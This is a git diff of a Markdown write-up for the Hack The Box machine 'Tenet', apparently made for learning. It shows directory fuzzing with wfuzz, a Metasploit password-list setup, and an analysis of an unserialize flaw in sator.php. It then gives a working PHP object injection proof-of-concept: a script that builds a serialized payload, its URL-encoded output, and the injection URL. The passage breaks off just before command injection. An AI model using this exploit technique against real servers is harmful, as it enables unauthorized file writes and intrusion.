@@ -166,7 +166,7 @@
        DB_ALL_USERS         false                                           no        Add all users in the current database to the list
        ENUMERATE_USERNAMES  true                                            yes       Enumerate usernames
        PASSWORD                                                             no        A specific password to authenticate with
-       PASS_FILE            rockyou.txt  no        File containing passwords, one per line
+       PASS_FILE            rockyou.txt                                     no        File containing passwords, one per line
        Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
        RANGE_END            10                                              no        Last user id to enumerate
        RANGE_START          1                                               no        First user id to enumerate
@@ -250,7 +250,9 @@ $ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u ht
     =====================================================================
     000008552:   200        31 L     70 W       514 Ch      "bak"   
  
- // Great we found extention 'bak', lets navigate to http://10.10.10.223/sator.php.bak to see his content
+// Great we found extention 'bak', lets navigate to http://10.10.10.223/sator.php.bak to see his content
+ 
+![Image 8.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/8.1.png)
  
     $ cat sator.php.bak 
 
@@ -288,19 +290,78 @@ $ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u ht
 
 // The script has [class](https://www.zend.com/blog/what-php-class) called 'DatabaseExport'
 
-// And it takes file called 'users.txt' and return '$data' that will be a string(in our case 'Success')
+// And it contains usr_file called 'users.txt' and '$data' that will be a string(in our case 'Success')
 
 // Next we have function called 'update_db' that first prints string and insert string to value '$data'
 
-// Next we have another function called 'destruct' , this function output file with 'users.txt' and '$data' content
+// Next we have another function called 'destruct' , this function uses 'file_put_contents' to write '$data' content to file 'users.txt'
 
-// Next we can see there is a command to server get [arepo](https://en.wikipedia.org/wiki/Sator_Square)
+// Also earlier we see that dirsearch find http://10.10.10.223/users.txt page that indeed print 'SUCCESS'
+
+// Next we can see there is a variable 'arepo' , that called with GET method 
+
+// And the script takes string query passed in the variable 'arepo' OR a blank string([?? ''](https://www.tutorialspoint.com/php7/php7_coalescing_operator.htm)) 
 
 // And finally [unserialize](https://www.php.net/manual/en/function.unserialize.php) with the input command to update data base.
 
----> [source](https://en.wikipedia.org/wiki/Sator_Square)(from wikipedia) <---
+---> [Wikipedia source](https://en.wikipedia.org/wiki/Sator_Square) <---
 
     "" In computing, serialization (US spelling) or serialisation (UK spelling) is the process of translating a data structure
     or object state into a format that can be stored (for example, in a file or memory data buffer) or transmitted
     (for example, over a computer network) and reconstructed later (possibly in a different computer environment) ""
+
+// So here i understand that serialization is to take file and change him into a format that program understand and can be stored.
+
+// So basically in our case the vulnerability is that the program can pass unserialize(Not checked) value,
+
+// And actually its a door to [PHP Object injection](https://www.youtube.com/watch?v=HaW15aMzBUM)(ippsec video) !
+
+// [OWASP source](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) AND [This source](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) also put some light on PHP Object injection
+
+// So according to the sources,
+
+// First, we need to check if can control the output file
+
+![Image 9](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/9.png)
+
+    $ cat attack.php
+
+    <?php
+
+    class DatabaseExport
+    {
+        public function __construct()
+        {
+            $this->user_file = 'W0lfysec.txt';
+            $this->data = 'MY_TEST';
+        }
+    }
+
+    $obj = new DatabaseExport;
+    echo urlencode(serialize($obj));
+    echo "\n";
+
+    ?>
+
+// Run our file to get URL encoded payload
+
+    $ php attack.php 
+    
+    O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A12%3A%22W0lfysec.txt%22%3Bs%3A4%3A%22data%22%3Bs%3A7%3A%22MY_TEST%22%3B%7D
+
+// And add the payload to http://10.10.10.223/sator.php?arepo=PAYLOAD
+
+![Image 10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/10.png)
+
+// We can see there 2 strings duplicated strings abour DB being updated
+
+// Its ok, it indicates about 2 objects instantiated.
+
+// Check if worked navigate to http://10.10.10.223/YOURS-user_file-NAME
+
+![Image 11](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/11.png)
+
+// And it worked !
+
+// Next we will try to inject a command cli with $_REQUEST
 
